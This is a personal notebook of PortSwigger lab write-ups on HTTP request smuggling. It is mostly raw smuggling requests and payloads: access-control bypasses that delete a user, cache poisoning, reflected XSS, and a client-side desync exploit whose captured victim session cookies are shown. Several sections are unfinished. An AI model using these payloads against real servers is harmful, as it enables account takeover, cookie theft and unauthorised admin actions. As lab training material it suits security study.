<span style="color:yellow;font-weight:700;font-size:30px">
HTTP request smuggling: 3 Labs
</span>
https://portswigger.net/web-security/request-smuggling

**HTTP Desync Attacks: Request Smuggling Reborn:**

https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn

# ***1.Lab: HTTP request smuggling, basic CL.TE vulnerability***
https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

 This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 

1. send request:
```
POST / HTTP/1.1
Host: 0aa40073033eec32c0e523a2006c0054.web-security-academy.net
Content-Length: 0

G
```
while the front-end CL logic 


# Lab Solved

# ***2.Lab: HTTP request smuggling, basic TE.CL vulnerability***
https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl

 This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST. 




# ***3.Lab: HTTP request smuggling, obfuscating the TE header***
https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header



<span style="color:yellow;font-weight:700;font-size:30px">
Finding HTTP request smuggling vulnerabilities: 2 Labs
</span>

https://portswigger.net/web-security/request-smuggling/finding


# ***1. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses***
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses

```(to be completed from soultion below...)```

# ***2. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses***
https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses

```(to be completed from soultion below...)```

<span style="color:yellow;font-weight:700;font-size:30px">
Exploiting HTTP request smuggling vulnerabilities:  Labs
</span>

https://portswigger.net/web-security/request-smuggling/exploiting


# ***1. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability***
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

```(to be completed from soultion below...)```

# ***2. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability***
https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl

```(to be completed from soultion below...)```

# ***3. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting***
https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

```(to be completed from soultion below...)```

# ***4. Lab: Exploiting HTTP request smuggling to capture other users' requests***
https://portswigger.net/web-security/request-smuggling/exploiting/lab-cature-other-users-requests

```(to be completed from soultion below...)```

# ***5. Lab: Exploiting HTTP request smuggling to deliver reflected XSS***
https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss


<span style="color:yellow;font-weight:700;font-size:30px">
Client-side desync  2 Lab
</span>

https://portswigger.net/web-security/request-smuggling/browser/client-side-desync

# ***[1. Lab: Client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-client-side-desync)

This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.

To solve the lab:

    Identify a client-side desync vector in Burp, then confirm that you can replicate this in your browser.

    Identify a gadget that enables you to store text data within the application.

    Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.

    Use the stolen cookie to access the victim's account.

solution:
1. Identify a client-side desync vector in Burp
**request1** in group send:
```
POST / HTTP/1.1
Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```
**request 2** in group send:
```
POST / HTTP/1.1
Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```
2. replicate in browser: in exploit server on incognito session, open devtool/console and write the request as a fetch command (the CORS is to prevent the /en redirection):
```js
fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
    method: 'POST',
    body: 'GET /hopefully404 HTTP/1.1\r\nFoo: x',
    mode: 'cors',
    credentials: 'include',
}).catch(() => {
        fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```

3. Identify a gadget that enables you to store text data within the application: use the comment section by changing the order of the parameters (so comment will be at the end) and leave it empty:
```
csrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.clom&website=http://Abla.com&comment=
```

4. Combine these to craft an exploit

**request 1**:
```
POST / HTTP/1.1
Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
Connection: keep-alive
Content-Length: 554

POST /en/post/comment HTTP/1.1
Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net
Cookie: session=hwUeKh4HGzH0JRhplmzO1AqGTjghpI44; _lab_analytics=V1zlo14KL0l6CZMT7HC5ou1CoTEtACSFxLBI3LCux1khc4JZ9FpQPyaC04RrFOTPZFD0ONUaH1eSdjO2ARZ7UmrlOlZG81BN9fLdarU4ijgp8CVvNdgiDshST0nbgiAVqgMUm2T4UcAkK58hDlFt8iJpv1PUJBlTyNPZ8Gm0CZH2sfJcsiFhFsiXfOvaoNYq5WXd6MrlKIupO2VTOsD1ecPkWMXSWocU5bPM0ZQV4WUvYDRRIqZ7XiCgrEdhY67R
Content-Length: 160

csrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.clom&website=http://Abla.com&comment=
```

**request 2**:
```
GET /capture-me HTTP/1.1
Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net


```

5. replicate in browser:
```js
fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net\r\nCookie: session=hwUeKh4HGzH0JRhplmzO1AqGTjghpI44; _lab_analytics=V1zlo14KL0l6CZMT7HC5ou1CoTEtACSFxLBI3LCux1khc4JZ9FpQPyaC04RrFOTPZFD0ONUaH1eSdjO2ARZ7UmrlOlZG81BN9fLdarU4ijgp8CVvNdgiDshST0nbgiAVqgMUm2T4UcAkK58hDlFt8iJpv1PUJBlTyNPZ8Gm0CZH2sfJcsiFhFsiXfOvaoNYq5WXd6MrlKIupO2VTOsD1ecPkWMXSWocU5bPM0ZQV4WUvYDRRIqZ7XiCgrEdhY67R\r\nContent-Length: 1128\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.com&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
```
6. final payload in exploit to send to victim:
```htm
<script>
fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net\r\nCookie: session=hwUeKh4HGzH0JRhplmzO1AqGTjghpI44; _lab_analytics=V1zlo14KL0l6CZMT7HC5ou1CoTEtACSFxLBI3LCux1khc4JZ9FpQPyaC04RrFOTPZFD0ONUaH1eSdjO2ARZ7UmrlOlZG81BN9fLdarU4ijgp8CVvNdgiDshST0nbgiAVqgMUm2T4UcAkK58hDlFt8iJpv1PUJBlTyNPZ8Gm0CZH2sfJcsiFhFsiXfOvaoNYq5WXd6MrlKIupO2VTOsD1ecPkWMXSWocU5bPM0ZQV4WUvYDRRIqZ7XiCgrEdhY67R\r\nContent-Length: 1128\r\nContent-Type: x-www-form-urlencoded\r\nConnection: keep-alive\r\n\r\ncsrf=ZkkNzRQvySXZaQk7VfgMDdDJEiY3pLqr&postId=5&name=test&email=test@gmail.com&website=https://portswigger.net&comment=',
        mode: 'cors',
        credentials: 'include',
    }).catch(() => {
        fetch('https://0a22009703bb73a2c21b484400ab00eb.web-security-academy.net/capture-me', {
        mode: 'no-cors',
        credentials: 'include'
    })
})
</script>
```
7. check comment section to see extracted information - change the Fetch content length value until it includes all of the victims credentials:
```
test | 15 December 2022

GET /capture-me HTTP/1.1 Host: 0a22009703bb73a2c21b484400ab00eb.web-security-academy.net Connection: keep-alive sec-ch-ua: sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.98 Safari/537.36 sec-ch-ua-platform: Accept: */* Sec-Fetch-Site: cross-site Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: empty Referer: https://exploit-0ae0004c03ab7374c215472001ab0065.exploit-server.net/ Accept-Encoding: gzip, deflate, br Accept-Language: en-US Cookie: victim-fingerprint=DJjriCxtcfLHmjTrBDq730YNd2xUAPPI; secret=lqMu6fnfGeVwefRyznYrI06s20P1S7eW; session=8HVg9nVrLBu6aoyKlEw9zQLRWojb3vlU; _lab_analytics=bxfDqujwSLZuV1BnVlFs7eiaFellGjBCbtCKwZaWen4kRvaUmCcdHIEjDKBbiHB9ULUQpc9OKuEvu1IIDr4PAb7cce8HAsdkOYLTkBk4Ox1O7LYb8tlZqXuqG0meWH2r4gtNvNfNjVQTr3ZZArGoHrwbnDJ58TfwIgcAwx7yKgsfSIAju1MfhxdrEoKY6EGIU6UheyLQ3o6BeO89uLyQD34Jpm7Fharv5il0DDx3FeOIhaTr2qUVdgFR7QVK7y0
```

8. use credentials to impersonate the victim 

# lab solved


# [***2. Lab: Browser cache poisoning via client-side desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-browser-cache-poisoning-via-client-side-desync)

 This lab is vulnerable to client-side desync attacks. You can exploit this to induce a victim's browser to poison its own cache.

To solve the lab:

    Identify a client-side desync vector in Burp, then confirm that you can trigger the desync from a browser.

    Identify a gadget that enables you to trigger an open redirect.

    Combine these to craft an exploit that causes the victim's browser to poison its cache with a malicious resource import that calls alert(document.cookie) from the context of the main lab domain.

Note: When testing your attack in the browser, make sure you clear your cached images and files between each attempt (Settings > Clear browsing data > Cached images and files).

Hint:This lab is a client-side variation of a technique that we covered in a previous request smuggling lab.

1. test for dsync
```
POST /../ HTTP/1.1

Content-Length: 36

GET /hopefully404 HTTP/1.1
Foo: x
```
response
```
HTTP/1.1 500 Internal Server Error
```

2. TBC

3. TBC

4. using normaliztion of cap to lower, through 301 permanent redirect,  to do an open redirect :)
request:
```
GET //https://exploit-0a98005003e69928c1da39a301700077.exploit-server.net/EXPLOIT HTTP/1.1
```
response:
```
HTTP/1.1 301 Moved Permanently
Location: //https://exploit-0a98005003e69928c1da39a301700077.exploit-server.net/exploit
```

# TBC



<span style="color:yellow;font-weight:700;font-size:30px">
Pause-based desync:  1 Lab
</span>

https://portswigger.net/web-security/request-smuggling/browser/pause-based-desync

 This lab is vulnerable to pause-based server-side request smuggling. The front-end server streams requests to the back-end, and the back-end server does not close the connection after a timeout on some endpoints.

To solve the lab, identify a pause-based CL.0 desync vector, smuggle a request to the back-end to the admin panel at /admin, then delete the user carlos. 

Some server-side pause-based desync vulnerabilities can't be exploited using Burp's core tools. You must use the Turbo Intruder extension to solve this lab. 

**material**
```
POST /example HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: x
```

from previous labs:
```
POST /resources/images/blog.svg HTTP/1.1
Host: 0a5600b20333dff4c00669e0008900cf.web-security-academy.net
Cookie: session=g7dk6M42BAlaCge5bRfY2UUbrkTgVcpx
Connection: keep-alive
Content-Length: 63

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```
1. check for dsync:



(*if not working check if request has \r\n\r\n in the end)


2. payload:
**intruder:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=500,
                           pipeline=False
                           )

    engine.queue(target.req, pauseMarker=['Content-Length: 171\r\n\r\n'], pauseTime=61000)
    engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```


**Attack request:**
```
POST /resources HTTP/1.1
Host: 0adf00fb04059385c078d83200950011.web-security-academy.net
Cookie: session=5FpST7gbaHJvcQdBMBa8GSPprFONGjBP
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 171

POST /admin/delete/ HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

csrf=DHagB4bCjIHsqTfd7d05kyFDOmPbthrM&username=carlos
```
(*content length must be correct otherwise intruder pause-filter will fail)

# Lab solved






























# solutions without the writeup - to be completed above

**xss-test**
```
GET /post?postId=4 HTTP/1.1
Host: ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net
Cookie: session=n10QJWvUWpZaTBuS6R2BlN4uE99NwP8t
User-Agent: "><script>alert("test: xss is working")</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Dnt: 1
Referer: https://ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close
```


**CL.TE XSS**
```
POST / HTTP/1.1
Host: ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net
Cookie: session=n10QJWvUWpZaTBuS6R2BlN4uE99NwP8t
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 144
Transfer-Encoding: chunked

0


GET /post?postId=6 HTTP/1.1
Host: ac921f5f1ecc9e31c0fc4e600043000a.web-security-academy.net
User-Agent: ">http://burpsuite/repeat/37/sa4enoczhvngtl66ydx6pep3dtmpp8gx<script>alert(1)</script>
x:
```

# 6. Lab: Exploiting HTTP request smuggling to perform web cache poisoning
https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning

**CL.TE Cache Poisoning**

POST / HTTP/1.1
Host: ac281fc71f89bf7ac0980d6a00500011.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Transfer-Encoding: chunked

0


GET /post/next?postId=4 HTTP/1.1
Host: exploit-acff1fb51f72bf78c0560d1201d200e2.web-security-academy.net/
Content-Type: application/x-www-form-urlencoded
Content-Length: 10


X=1


# 7. Lab: Exploiting HTTP request smuggling to perform web cache deception
https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception

**CL.TE Cache Deception**

POST / HTTP/1.1
Host: acde1f821f1afb5ec028f00500350099.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Transfer-Encoding: chunked

0


GET /my-account HTTP/1.1
X-Ignore: X

# **Advanced request smuggling**
https://portswigger.net/web-security/request-smuggling/advanced

# 1.Lab: H2.CL request smuggling
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-cl-request-smuggling


POST / HTTP/2
Host: acee1fff1f18c42dc0510c2d00ab00fd.web-security-academy.net
Content-Length: 0


GET /resources HTTP/1.1
Host: exploit-ac2e1f281f3ec410c0430c8601f40002.web-security-academy.net
Content-Length: 5


x=1
# 2. Lab: HTTP/2 request smuggling via CRLF injection
https://portswigger.net/web-security/request-smuggling/advanced/lab-request-smuggling-h2-request-smuggling-via-crlf-injection

**H2.TE using CRLF**

POST / HTTP/2
Host: acec1ffb1ef20ceac097a6f300b50082.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
X: bs$Transfer-Encoding: chunked # $ = CRLF
Content-Length: 541

0

POST /post/comment HTTP/1.1
Host: acec1ffb1ef20ceac097a6f300b50082.web-security-academy.net
Cookie: session=YiFWOusmxqoDwar9NZqRa5SRACXiE8kH; _lab_analytics=k2hEpEMnh7FOlL08tsdU6yMrH5vH786oPccuLkKph1zM68i5HmMENqjtlS6uDn6yd0rQpCKxt2RJqeOveudPh9abuI3oC7uswrYWtOQXGddomfVqNjbuoVjGxQa74PeWlEHZyRaNSqdarVtob9Vy9TIP4yogrPFHLLSeNKaASTKlFzvfvG5QyoGoq4mNqPtebBx7mdtQW6IePy0Vx5uDp5kFRohfrg6COqR5S7YJAn6WsZXZ8EWdRcNi6fmpyvu4
Content-Length: 1050


csrf=voFPOhHSY6nNJgKCxH4V10pzV0Zjx2ik&postId=4&name=dd&email=admin@dmin.min&website=&comment=


# 3. Lab: HTTP/2 request splitting via CRLF injection
https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors

**inside http2 header:**
name:
x 

Value:
break here

GET /404 HTTP/1.1
Host: aca11f101e26b91ec04c41f1002700cd.web-security-academy.net

# **HTTP request tunnelling**
https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling

# 1. Lab: Bypassing access controls via HTTP/2 request tunnelling
https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling

**leakage payload**
```
name:
foo: bar
Content-Length: 115

search=x


value:
xuy
```

**admin payload:**
```
name:
foo:bar

GET /admin/delete?username=carlos HTTP/1.1
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 3391277118436530

value:
xuy
```

**delete carlos:**
```
name:
foo:bar

GET /admin/delete?username=carlos HTTP/1.1
X-SSL-VERIFIED: 1
X-SSL-CLIENT-CN: administrator
X-FRONTEND-KEY: 3391277118436530

value:
xuy
```

# 2. Lab: Web cache poisoning via HTTP/2 request tunnelling
https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-web-cache-poisoning-via-request-tunnelling
```
name: :path
value: / HTTP/1.1
Host: acbf1fef1e4fed6ec0bf6ef7000b006a.web-security-academy.net
```

```
GET /resources?<script>alert(1)</script>foobar1234567890foobar1234567890...{X570 times}...1234567890foobar1234567890 HTTP/1.1
Foo: bar
```

# **HTTP/2-exclusive vectors**
https://portswigger.net/web-security/request-smuggling/advanced/http2-exclusive-vectors


# 1. Lab: CL.0 request smuggling
https://portswigger.net/web-security/request-smuggling/browser/cl-0/lab-cl-0-request-smuggling

To solve the lab, identify a vulnerable endpoint, smuggle a request to the back-end to access to the admin panel at /admin, then delete the user carlos

1. since we need POST request to play around with the Te and CL - the only vector of attack is the **POST /login HTTP/1.1** request. - lets send it to repeater

2. use link of admin panel to send the request **GET /admin HTTP/1.1** to repeater

3. craft a combined request:
```
POST /login HTTP/1.1
Host: 0a2f00b603a96da1c04294f80075001b.web-security-academy.net
Cookie: session=gbZvHsAytPvTQtra4ySMIIyhl7J6tcAL
Connection: keep-alive
Content-Length: 0

GET /admin HTTP/1.1
Host: localhost
Cookie: session=gbZvHsAytPvTQtra4ySMIIyhl7J6tcAL
Connection: close

```
(or use the Group Tab option)

response:
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Keep-Alive: timeout=10
Content-Length: 26

"Missing parameter 'csrf'"HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 24

"Path /admin is blocked"
```

changing host to "**localhost**" or "**127.0.0.1**" yields the same response as the original host header **.web-security-academy.net**
```
"Path /admin is blocked" 
```
while setting host header to **192.168.0.1** yields a different error (back-end server?): 
```
    <html><head><title>Client Error: Forbidden</title></head><body><h1>Client Error: Forbidden</h1></body></html>
```
doing a TRACE command we get rsponse revealing it is the Front-end server who blocks our path to /admin)
www
"Frontend only accepts methods GET, POST, HEAD"
```
```
POST /post/comment HTTP/1.1
Host: 0a2f00b603a96da1c04294f80075001b.web-security-academy.net
Cookie: session=gbZvHsAytPvTQtra4ySMIIyhl7J6tcAL
Connection: keep-alive
Content-Length: 187

csrf=tIBFEReW1l5UCOO0L0naEobAtmRps3Xj&postId=6&comment=test+123&name=123&email=clea@token.com&website=https://bs.com
```
```
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
```




```


# **CL.0 request smuggling**
https://portswigger.net/web-security/request-smuggling/browser/cl-0

1. we start by exploring possible endpoint to exploit:
```
/
/post?postId=x
/login 
/resources/images/x.svg
```

as lab description implies: any of those endpoints could be sitting in a different back-end server, maybe the one with vularbility, so we will check our payload on all of them.
<!-- 
lets change all of them to POST to make sure method is suported for the endpoint:
```
POST /post/comment HTTP/1.1
POST /post?postId=8 HTTP/1.1
POST /login HTTP/1.1
POST /resources/images/avatarDefault.svg HTTP/1.1
POST /resources/images/blog.svg HTTP/1.1
``` -->

lets also check the blocking mechanism by calling the delete link within the admin panel:
```
request:
POST /admin/delete?username=carlos HTTP/1.1
Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net

response:
HTTP/1.1 403 Forbidden
..
"Path /admin/delete is blocked"
```
(this is the Front-End Path-blocking us from reaching restricted areas)


2. craft a Probe for a CL.0 (basicly a CL:TE without the TE or something similar):

since we deal with back end server who ignores CL (so it will TE even without explicit order)  - we will leave the Burps **Update Content length** option checked. 

for the **carrier request** we will start by striping redundent headers for clean structure:
```
POST / HTTP/1.1
Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
Connection: close
Content-Length: 0
```
change **Connection:** header to **keep-alive** (to support our smuggled request)

(this way Front End server will get a valid CL value, that reflects full payload, and let everything through. A value that the later Back-End server will be more than happy to ignore and do his own thing. you know, TE)

for the **smuggeld request** we will use the **/**:
```
POST / HTTP/1.
Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
Connection: keep-alive
Content-Length: 27

POST / HTTP/1.1
foo: x
```
sending the payload yields no abnormal resaults. lets try it on other endpoint:



**Prob's carft:**
```
POST / HTTP/1.1
Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
Connection: close
Content-Length: 0


POST /404finder HTTP/1.1
foo: x
```
all response are 200 ok for the carrier request.

lets look into other endpoint until we find the one acting strangly:
POST /post/comment HTTP/1.1 - normal
POST /my-account HTTP/1.1 - normal
POST /resources/images/blog.svg HTTP/1.1 - not normal!
```
we obderve we get a responses for the svg resource and a "404 not found" immidiatly after. this implies the resource server is vulnerable to suggeling

lets arm the prob with a "delete carlos" warhead:
```
POST /resources/images/blog.svg HTTP/1.1
Host: 0ae4006204a47aebc0c9a0a2002900ef.web-security-academy.net
Cookie: session=I60GZDQYEO0y8V8YuTucPs9FQhArLUMl
Connection: keep-alive
Content-Length: 54


GET /admin/delete?username=carlos HTTP/1.1
x: x

```

Victory! Carlos is deleted!








payload:
POST /resources/images/blog.svg HTTP/1.1
Host: 0a5600b20333dff4c00669e0008900cf.web-security-academy.net
Cookie: session=g7dk6M42BAlaCge5bRfY2UUbrkTgVcpx
Connection: keep-alive
Content-Length: 63

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost






**this is the solutions - but without the proper lab name link and explanation. sorry early work - to be updated. I am keeping work here so you might draw ideas from payload, even if it is a mess of a writeup... :) **
==========================================================================================================






=====

# H2.TE queue poisoning

POST /x HTTP/2
Host: ac741fef1ecbb9b6c08a249d00ed001b.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: ac741fef1ecbb9b6c08a249d00ed001b.web-security-academy.net






**Victim-sim**

GET /resources/js/tracking.js HTTP/1.1
Host: acde1f821f1afb5ec028f00500350099.web-security-academy.net
Connection: keep-alive



======


**eXpolit CL.TE**


GET /admin HTTP/1.1
Host: acaa1fde1fa8b3bac0cb855100b50051.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 0


# =====



**CL.TE w/Header**

POST / HTTP/1.1
Host: acf71f8a1f345eddc0000f56001f0021.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 783
Transfer-Encoding: chunked

0
POST /post/comment HTTP/1.1
Host: ac1c1f721ebd30e9c0541639006c0008.web-security-academy.net
Cookie: session=0BuWWqgFxPjVqGHNwSzsLPaiO3EspVVi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Connection: keep-alive

csrf=qTJKlDhPrsaejyG75wXWWpUN8chxgI9v&postId=6&name=rrr&email=admin%40admin.min&website=&comment=test1POST /post/comment HTTP/1.1
Host: ac001f691eefa296c06906df006100eb.web-security-academy.net
Cookie: session=E2UEMjsoaOROqMNNacONYRfeHSu72oO1
Content-Type: application/x-www-form-urlencoded
Content-Length: 850

csrf=3YiinGWwJFKC23Odz76V3PtjQGjNmQLJ&postId=8&name=carlos&email=carlos%40carlo.com&website=&comment=ddd
POST / HTTP/1.1
Host: acf71f8a1f345eddc0000f56001f0021.web-security-academy.net
Cookie: session=m4e6JihcaYRcW5PC16lXj0tX8cgztgux
Content-Length: 250
Connection: close

search=

=====

# TE.CL Payload

POST / HTTP/1.1
Host: acd71f9d1f4b2cc9c03068760067007d.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked

45
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost





0

=====


# CL.TE Payload


POST / HTTP/1.1
Host: ac1f1f0a1f8b5802c0dd261b00c800f3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 68
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost


====

# CL.TE Post Xploit

POST / HTTP/1.1
Host: ac001f691eefa296c06906df006100eb.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 322
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac001f691eefa296c06906df006100eb.web-security-academy.net
Cookie: session=E2UEMjsoaOROqMNNacONYRfeHSu72oO1
Content-Type: application/x-www-form-urlencoded
Content-Length: 835

csrf=3YiinGWwJFKC23Odz76V3PtjQGjNmQLJ&postId=8&name=carlos&email=carlos%40carlo.com&website=&comment=



====

# vicsim

GET /my-account HTTP/1.1
X-zimbur: NOGET /my-account HTTP/1.1
Host: acde1f821f1afb5ec028f00500350099.web-security-academy.net
Cookie: session=pcjtCreKAJsw0zSatysVhGpr0UxjypnX
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acde1f821f1afb5ec028f00500350099.web-security-academy.net/login
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers
Connection: close

=====

# CL.TE - breaker

POST / HTTP/1.1
Host: ac491f8c1fc99226c06d5636006b004f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x






